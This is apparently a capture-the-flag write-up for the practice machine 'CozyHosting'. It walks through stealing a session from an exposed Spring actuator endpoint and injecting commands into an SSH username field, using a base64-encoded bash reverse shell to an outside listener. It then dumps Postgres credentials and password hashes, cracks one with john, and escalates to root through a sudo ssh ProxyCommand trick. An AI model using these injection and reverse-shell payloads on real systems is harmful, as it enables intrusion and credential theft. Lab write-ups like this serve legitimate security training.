# CozyHosting
#activemachine 
#easy
#sql
#web 
#postgres 
#euid 
#hashcrack 
#commandinjection
#cookie 
### Reconnaissance
We started by running the command `nmap -sV -v $TARGET` to gather information about the target system. The output showed us the open ports, services, and version information. We noticed that port 22 (SSH) was open, also the port 80 (HTTP).
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### Web Application Analysis
The web is going to be our entry point, so we go to it, after trying to enter we notice the URL has changed to `http://cozyhosting.htb/`  so we add it to /etc/hosts with `echo "${TARGET} cozyhosting.htb" | sudo tee -a /etc/hosts`.

Now we have a website which doesn't show any relevant information at first, so we keep searching to find a login, but it seems we cant do a sqli/bruteforce. As we didn't find nothing interesting with the manual search we perform a automatized search in order to see hidden places of the web, to do this run  `dirsearch -u http://cozyhosting.htb`
```
Target: http://cozyhosting.htb/

[19:37:47] Starting: 
[19:38:01] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[19:38:05] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[19:38:06] 400 -  435B  - /a%5c.aspx
[19:38:08] 200 -  634B  - /actuator
[19:38:08] 200 -   15B  - /actuator/health
[19:38:08] 200 -    5KB - /actuator/env
[19:38:08] 200 -   10KB - /actuator/mappings
[19:38:08] 200 -  345B  - /actuator/sessions
[19:38:08] 200 -  124KB - /actuator/beans
[19:38:09] 401 -   97B  - /admin
[19:38:31] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[19:38:31] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[19:38:31] 500 -   73B  - /error
[19:38:31] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[19:38:32] 200 -    0B  - /extjs/resources//charts.swf
[19:38:35] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[19:38:36] 200 -   12KB - /index
[19:38:39] 200 -    4KB - /login
[19:38:40] 200 -    0B  - /login.wdm%2e
[19:38:40] 204 -    0B  - /logout
[19:38:52] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed
```
We find 2 relevant things in this analysis the first one being the `/actuator` endpoints and the second one the `/admin`, we check first the admin one with no sucess because we need to be logged in, in order to enter there, so we check the other one which returns the following

```
{"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}
```
There are more endpoints inside this one so we start by checking the most promising one which is `/actuator/sessions`, this one returns us a list of users with their associated sessions ID, we are going to use this one `kanderson`:`D26144FA5A9B80AF309A27B40327167A`

Now that we "have"  a session ID, we can go to `/admin`, intercept and modify the request with burpsuite and add our new session ID cookie to the request, after this we finally got access to the admin tab, here we can add new SSH connections to machines. We could pottentially exploit this so add a dummy SSH connection and we intercept the request in burpsuite, in order to play more with this request we can press `CTRL + R`, this send the request to the repeater where we can modify and sent it a lot of times.
After messing around with the request, it seems that we can inject commands in the username parameter this is because the website must be doing something like `ssh ${YOUR_USERNAME}@{YOUR_IP}`.

Knowing this we can perform a command injection, to prevent errors we are going to inject the desired command in base64, so first we generate the command which will be a reverse shell by running  `echo 'bash -c bash -i >&/dev/tcp/10.10.14.151/9000 0>&1' | base64`

Our command in base64 is `YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUxLzkwMDAgMD4mMQo=`
To upload the command the is one more thing we need to know, as we cant use spaces inside a HTTP parameter, we must find a way around it, in this case as the command is being interpreted by a shell we can trick the shell to recognize spaces where the HTTP doesn't see them by using the  ${IFS}, this variable has inside the separation character representation(by default space).

Finally we can upload the following command in the username `;echo${IFS}"YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUxLzkwMDAgMD4mMQo="|base64${IFS}-d|bash;`

Before sending the request we need to launch the reverse shell with `nc -lvp 9000`

### Lateral movement

As usual we improve our terminal by running `python3 -c 'import pty;pty.spawn("/bin/bash")'`, once in we see a file called `cloudhosting-0.0.1.jar`, after downloading it to our local machine and uncompressing it, we have a lot of files.

The one we are looking for is `BOOT-INF/classes/application.properties`, here we can find the following data which we can use to keep going.

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
As we have the user,port and password of a database hosted in the server we can check its contents by running  `psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost:5432/cozyhosting"` on the server. Inside it as it is a Postgres database we can run `\dt` to list all the tables.

```
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

```
The users table may have some credentials inside it, so we select all its contents with `SELECT * FROM users;`
```

   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)
```
We have 2 usernames and their associated hashed password, as the hashes can be usefull we save them into a file, to perform a brute-force search using a word-list to check if we have any of the hashes passwords we run the following command and then `john -w=/usr/share/wordlists/rockyou.txt hashes`-
```
manchesterunited
```
With our brand new password we can perform a lateral movement and login as the user `kanderson`.  In the `/home` is the `user.txt` that contains the user flag.

### Privilege escalation
Start by checking if our user has some special id or if it is able to run any command as sudo, to do this `id && sudo -l`
```
uid=1003(josh) gid=1003(josh) groups=1003(josh)
(root) /usr/bin/ssh *
```
We can run ssh as sudo, so we check in https://gtfobins.github.io/gtfobins/ssh/ if there is any way to exploit this, and it seems to be so, we just need to run this `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`.
In the new terminal we check our user with `whoami`
```
root
```
We have successfully escalated privileges, now we can read the flag that is in in `/root/root.txt`
